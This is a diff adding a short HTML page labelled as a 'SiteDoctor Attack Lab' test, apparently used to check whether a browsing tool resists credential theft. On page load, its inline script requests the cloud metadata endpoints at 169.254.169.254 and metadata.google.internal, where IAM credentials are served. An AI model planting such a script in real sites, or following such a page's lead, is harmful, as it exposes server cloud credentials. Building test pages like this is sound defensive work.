@@ -1,0 +1,17 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Attack 1 · Steal cloud credentials</title>
+
+<style>body{font:16px/1.6 system-ui,sans-serif;max-width:720px;margin:40px auto;padding:0 20px;color:#1d2430}h1{font-size:28px}.note{background:#fff4e5;border:1px solid #f3c27a;padding:12px 14px;border-radius:8px;font-size:14px}</style>
+</head>
+<body>
+<h1>Attack 1 · Steal cloud credentials</h1>
+<p class="note">SiteDoctor Attack Lab — this page is deliberately hostile. It attacks whatever opens it.</p>
+<p>Looks like a normal bakery page. A script asks the cloud metadata service for the server's credentials.</p>
+<script>
+(async()=>{for(const u of ["http://169.254.169.254/v1.json","http://169.254.169.254/latest/meta-data/iam/security-credentials/","http://metadata.google.internal/computeMetadata/v1/"]){try{await fetch(u)}catch(e){}}})();
+</script>
+</body>
+</html>
